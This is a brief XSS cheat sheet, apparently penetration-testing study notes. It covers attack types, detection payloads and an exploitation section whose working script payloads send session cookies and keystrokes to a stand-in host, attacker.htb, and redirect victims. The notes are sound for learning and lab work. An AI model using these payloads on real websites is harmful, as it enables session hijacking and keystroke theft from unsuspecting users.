## What is it

XSS is an attack where you inject malicious JavaScript into a webpage that gets executed by other users' browsers. The server trusts your input and reflects it back without sanitization, making the victim's browser run your code.

---
## Types

**Reflected** — payload is in the request (URL, form) and reflected immediately in the response. Not stored, victim needs to click a crafted link.

**Stored** — payload is saved in the database and executed every time the page is loaded. More dangerous, no interaction needed beyond visiting the page.

**DOM-based** — payload is processed by client-side JavaScript directly, never touches the server.

---
## How to detect it
- Any input that gets reflected back in the page (search bars, comments, usernames, error messages)
- Check if special characters like `<>"'` are sanitized or reflected raw
- Basic test payload:
```html
<script>alert(1)</script>
```

- If blocked, try alternatives:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---
## How to exploit it

**Cookie stealing** — grab session cookies if they're not HttpOnly:
```javascript
<script>fetch('http://attacker.htb/?c='+document.cookie)</script>
```

**Keylogging** — capture keystrokes:
```javascript
<script>document.onkeypress=e=>fetch('http://attacker.htb/?k='+e.key)</script>
```

**Redirect** — send victim somewhere else:
```javascript
<script>window.location='http://attacker.htb'</script>
```

---
## Common targets

- Comment sections
- Search fields
- Username/profile fields
- Error messages that reflect input
- Any user-controlled data rendered in the page

---
## Tools

- Burp Suite — intercept and modify requests to test payloads
- XSS Hunter — blind XSS detection (fires when payload executes somewhere you can't see)
